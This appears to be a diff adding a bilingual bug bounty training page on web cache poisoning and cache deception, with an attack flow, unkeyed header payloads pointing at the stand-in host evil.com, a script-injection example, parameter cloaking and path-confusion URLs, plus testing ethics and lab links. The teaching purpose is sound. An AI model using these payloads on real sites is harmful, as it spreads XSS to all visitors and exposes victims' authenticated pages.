@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Cache Poisoning & Deception - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+        .cache-diagram { background: var(--surface-raised); border: 1px solid var(--border); border-radius: 8px; padding: 1.2rem; margin: 1rem 0; font-family: 'Cascadia Code', monospace; font-size: 0.8rem; line-height: 1.8; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 4: Advanced &gt; Web Cache Poisoning &amp; Deception
+        </div>
+
+        <div class="page-header">
+            <h1>Web Cache Poisoning & Deception</h1>
+            <p class="subtitle">
+                CDN/Cacheレイヤーを悪用してXSSやデータ漏洩を全ユーザに拡散する攻撃。
+                PayPal XSS+Cache Poisoning $18,900が代表的な高額報告。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-wsa">WSA Labs</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Cache Key Fundamentals</h2>
+            <p>
+                CDN/Reverse proxyはリクエストの一部をキャッシュキーとして使用し、
+                同じキーのリクエストにはキャッシュされたレスポンスを返す。
+            </p>
+
+            <h3>典型的なCache Key構成要素</h3>
+            <table>
+                <thead>
+                    <tr><th>Keyed (キャッシュキーに含まれる)</th><th>Unkeyed (含まれない)</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Host header</td><td>X-Forwarded-Host</td></tr>
+                    <tr><td>URL path</td><td>X-Original-URL</td></tr>
+                    <tr><td>Query string (一部/全部)</td><td>X-Rewrite-URL</td></tr>
+                    <tr><td>Accept-Encoding</td><td>X-Forwarded-Scheme</td></tr>
+                    <tr><td></td><td>User-Agent (場合による)</td></tr>
+                    <tr><td></td><td>Cookie (場合による)</td></tr>
+                </tbody>
+            </table>
+
+            <div class="callout">
+                <div class="callout-title">Core Principle</div>
+                <p>
+                    <strong>Unkeyedなinputがレスポンスに反映される</strong>場合、
+                    攻撃者は悪意あるレスポンスをキャッシュさせ、同じURLにアクセスする全ユーザに配信できる。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Web Cache Poisoning</h2>
+
+            <h3>Attack Flow</h3>
+            <div class="cache-diagram">
+Attacker → CDN:  GET /page HTTP/1.1
+                 Host: target.com
+                 X-Forwarded-Host: evil.com    ← Unkeyed header
+
+CDN → Origin:    Forwards request (including X-Forwarded-Host)
+Origin → CDN:    200 OK
+                 &lt;script src="https://evil.com/xss.js"&gt;&lt;/script&gt;
+                 ↑ Application reflects X-Forwarded-Host in response
+
+CDN:             Caches response under key = "GET /page target.com"
+
+Victim → CDN:   GET /page HTTP/1.1
+                 Host: target.com
+CDN → Victim:   200 OK (CACHED - contains attacker's XSS payload!)
+            </div>
+
+            <h3>Common Unkeyed Headers</h3>
+            <pre><code># Host override headers
+X-Forwarded-Host: evil.com
+X-Host: evil.com
+X-Forwarded-Server: evil.com
+
+# URL/Path override
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+# Scheme/Protocol
+X-Forwarded-Scheme: http  (force redirect to http → inject)
+X-Forwarded-Proto: http
+
+# Misc
+X-Forwarded-Port: 1234
+X-Original-Host: evil.com
+Forwarded: host=evil.com</code></pre>
+
+            <h3>Fat GET Requests</h3>
+            <pre><code># Some servers process body in GET requests
+# CDN ignores body (not part of cache key)
+GET /api/user HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+
+role=admin
+# If backend processes body → response changes → cached for all</code></pre>
+
+            <h3>Parameter Cloaking</h3>
+            <pre><code># Different URL parsers handle parameters differently
+# CDN uses first '?' as separator, backend uses ';' as separator
+
+GET /page?cachebuster=1;callback=alert(1)
+# CDN cache key: /page?cachebuster=1;callback=alert(1) (unique per test)
+# Backend sees: callback=alert(1) → reflected in JSONP → XSS cached!</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Web Cache Deception</h2>
+
+            <h3>Concept (逆方向の攻撃)</h3>
+            <p>
+                Cache Poisoningが「悪意あるコンテンツをキャッシュさせる」のに対し、
+                Cache Deceptionは「victimの認証済みレスポンスをキャッシュさせ、攻撃者が読む」。
+            </p>
+
+            <div class="cache-diagram">
+Attacker crafts URL: https://target.com/account/settings/nonexist.css
+                     ↑ CDN sees .css extension → "this is cacheable static content"
+                     ↑ Backend ignores /nonexist.css → returns /account/settings (authenticated)
+
+Step 1: Victim clicks link → CDN caches their authenticated response
+Step 2: Attacker accesses same URL → gets victim's cached account page
+            </div>
+
+            <h3>Path Confusion Techniques</h3>
+            <pre><code># Extension-based
+/account/settings/x.css
+/account/settings/x.js
+/account/settings/x.jpg
+
+# Path parameter
+/account/settings;x.css
+
+# Encoded separators
+/account/settings%2fx.css
+/account/settings%23x.css
+
+# Dot segments
+/static/../account/settings  (CDN caches as /static/.. , backend normalizes)</code></pre>
+
+            <h3>Conditions</h3>
+            <ul>
+                <li>CDNがURL拡張子/パターンでキャッシュ判定 (.css, .js, .jpg, /static/)</li>
+                <li>Backendがパスのtrailingコンポーネントをignoreして同じコンテンツを返す</li>
+                <li>認証済みレスポンスにCache-Control: no-storeが未設定</li>
+            </ul>
+        </div>
+
+        <div class="section">
+            <h2>CDN-Specific Behaviors</h2>
+            <table>
+                <thead>
+                    <tr><th>CDN</th><th>特徴的な動作</th><th>Attack Surface</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>Cloudflare</td><td>デフォルトで静的拡張子のみキャッシュ</td><td>Cache Deception via extension</td></tr>
+                    <tr><td>Fastly</td><td>VCL customization多い、Vary header処理</td><td>Vary header manipulation</td></tr>
+                    <tr><td>Akamai</td><td>Query string handling rules</td><td>Parameter-based poisoning</td></tr>
+                    <tr><td>Varnish</td><td>X-Forwarded-Hostをデフォルトで転送</td><td>Host header poisoning</td></tr>
+                    <tr><td>AWS CloudFront</td><td>Headers/cookies/query stringの選択転送</td><td>Forwarded header injection</td></tr>
+                </tbody>
+            </table>
+
+            <h3>Cache Key Normalization Issues</h3>
+            <pre><code># Path normalization difference
+CDN key: /page (normalized)
+Backend: /PAGE (case-insensitive match)
+→ /PAGE and /page share same cache entry on CDN
+
+# Encoding normalization
+CDN key: /page%2f (not normalized)
+Backend: /page/ (decoded)
+→ Different cache entries, same backend response</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Tools & Methodology</h2>
+
+            <h3>Param Miner (Burp Extension)</h3>
+            <p>
+                James Kettle作のBurp extension。Unkeyed headerとparameterを自動検出。
+                Web cache poisoningテストの必須ツール。
+            </p>
+            <ul>
+                <li><strong>Guess headers</strong>: Unkeyed headerを大量に試行</li>
+                <li><strong>Guess parameters</strong>: Unkeyed query parameterを検出</li>
+                <li><strong>Cache buster</strong>: テスト時にキャッシュを分離するパラメータ自動付与</li>
+            </ul>
+
+            <h3>Testing Methodology</h3>
+            <ol>
+                <li><strong>Cache動作の確認</strong>: レスポンスヘッダ (X-Cache, Age, CF-Cache-Status) を確認</li>
+                <li><strong>Cache buster設定</strong>: <code>?cb=random123</code> でテスト分離</li>
+                <li><strong>Unkeyed input探索</strong>: Param Minerで自動探索 or 手動header injection</li>
+                <li><strong>Reflection確認</strong>: Unkeyed inputがレスポンスのどこに反映されるか特定</li>
+                <li><strong>Exploit crafting</strong>: 反映箇所に応じたpayload作成 (XSS, redirect等)</li>
+                <li><strong>Cache buster除去</strong>: 本番キャッシュキーでpoison確認</li>
+            </ol>
+
+            <div class="callout warning">
+                <div class="callout-title">Testing Ethics</div>
+                <p>
+                    Cache poisoningテストは<strong>cache busterを必ず使用</strong>すること。
+                    本番キャッシュを汚染すると全ユーザに影響がでる。
+                    PoC成功を確認したら即座にキャッシュbustリクエストでクリアすること。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Real-World Reports</h2>
+
+            <div class="card">
+                <div class="card-title">PayPal XSS via Cache Poisoning ($18,900)</div>
+                <p>
+                    PayPalのX-Forwarded-Host headerがレスポンスのscript srcに反映される脆弱性を発見。
+                    このunkeyed headerを利用してXSS payloadをCDNにキャッシュさせ、
+                    PayPalにアクセスする全ユーザにXSSを配信可能に。
+                    単体XSS + Cache Poisoningの組み合わせで高額評価。
+                </p>
+            </div>
+
+            <div class="card">
+                <div class="card-title">DoD: Cache Poisoning via X-Original-URL</div>
+                <p>
+                    Department of DefenseのサイトでX-Original-URLヘッダーが
+                    バックエンドのルーティングを上書きし、管理画面のコンテンツを
+                    公開URLのキャッシュにpoisonすることに成功。
+                </p>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>WSA Labs</h2>
+            <div class="card">
+                <div class="card-title">PortSwigger Web Security Academy</div>
+                <ul>
+                    <li><a href="https://portswigger.net/web-security/web-cache-poisoning" target="_blank">Web cache poisoning</a></li>
+                    <li>Lab: Web cache poisoning with an unkeyed header</li>
+                    <li>Lab: Web cache poisoning with an unkeyed cookie</li>
+                    <li>Lab: Web cache poisoning with multiple headers</li>
+                    <li>Lab: Targeted web cache poisoning using an unknown header</li>
+                    <li>Lab: Web cache poisoning via an unkeyed query string</li>
+                    <li>Lab: Web cache poisoning via a fat GET request</li>
+                    <li><a href="https://portswigger.net/web-security/web-cache-deception" target="_blank">Web cache deception</a></li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="page-nav">
+            <a href="44-graphql.html">&larr; Prev: GraphQL Security</a>
+            <a href="46-http-smuggling.html">Next: HTTP Request Smuggling &rarr;</a>
+        </div>
+
+        <div style="margin-top:2rem; text-align:center;">
+            <button class="complete-btn" data-module-id="45-cache" onclick="toggleComplete('45-cache')">Mark Complete</button>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
